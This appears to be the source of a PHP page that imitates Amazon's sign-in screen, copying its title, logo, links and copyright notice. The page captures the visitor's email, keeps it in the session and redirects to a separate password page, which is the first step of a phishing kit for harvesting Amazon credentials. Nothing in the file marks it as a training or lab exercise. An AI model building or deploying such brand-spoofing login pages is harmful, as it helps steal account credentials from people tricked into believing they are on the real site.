<?php
    session_start();
    $error_msg = "";

    if($_SERVER['REQUEST_METHOD'] == 'POST')
    {
        $user = htmlspecialchars($_POST['username']);
        $pattern = "/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/";

        if(empty($user))
        { 
            $error_msg = "Enter your email or mobile phone number";
        }                    
        else if(!preg_match($pattern, $user))
        {
            $error_msg = "Wrong or Invalid email address or mobile phone number. Please correct and try again.";
        }
        else
        {
            $_SESSION['username'] = $user;
            {
                header("Refresh:0; url=pass.php");
                exit();
            }
        }
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Sign In</title>
    <link rel="shortcut icon" href="amazon.jpeg" type="image/x-icon">    
    <link rel="stylesheet" href="style.css">

</head>
<body>
    <header>
        <img src="amazonlogo.png" alt="Logo" width="150px" height="40px">
    </header>

    <main>
        <div class="main_con">
            <h1 style="font-weight: lighter;">Sign in</h1>

                <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="POST">      
                    <div style="font-weight: bold;font-size: 14px;">Email or mobile phone number</div>
                    <input type="text" name="username">
                    <div id="error_msg">    
                        <?php echo $error_msg; ?>
                    </div>
                    <input type="submit" value="Continue" class="continue">
                </form>
            <div class="bel_form">
                By continuing, you agree to Amazon's 
                <a href="/gp/help/customer/display.html/ref=ap_signin_notification_condition_of_use?ie=UTF8&amp;nodeId=200545940">Conditions of Use</a>
                and
                <a href="/gp/help/customer/display.html/ref=ap_signin_notification_privacy_notice?ie=UTF8&amp;nodeId=200534380">Privacy Notice</a>
                .
            </div>
            <div class="help">
                <a href="" style="text-decoration: none;">Need help?</a>
            </div>
            <!-- <hr color="black" size="2" width="320"> -->
            <div style="font-size: 12px;font-weight: bolder; border-top:1px solid rgb(148, 146, 146); width: 325px; padding: 10px 0 5px 10px;">
                Buying for work?
            </div>
            <a href="https://www.amazon.in/business/register/welcome?ref_=ab_reg_signin" style="text-decoration: none;font-weight: bold;">
                <span style="font-size: 12px;padding-left: 10px;">
                    Shop on Amazon Business
                </span>
            </a>
        </div>

        <div class="create_acc">
            <a href="" style="text-decoration: none;color: black;">Create your Amazon account</a>
        </div>
    </main>

    <div style="height: 50px;">
    </div>

    <footer>
        <div class="tc">
            <div class="component">
                <a href="https://www.amazon.in/gp/help/customer/display.html/ref=ap_desktop_footer_cou?ie=UTF8&nodeId=200545940">Conditions of Use</a>
            </div>
            <div class="component">
                <a href="https://www.amazon.in/gp/help/customer/display.html/ref=ap_desktop_footer_privacy_notice?ie=UTF8&nodeId=200534380">Privacy Notice</a>
            </div>
            <div class="component">
                <a href="https://www.amazon.in/gp/help/customer/display.html?ie=UTF8&nodeId=508510">Help</a>
            </div>
        </div>

        <div class="copyright">
            © 1996-2024, Amazon.com, Inc. or its affiliates
        </div>
    </footer>
</body>
</html>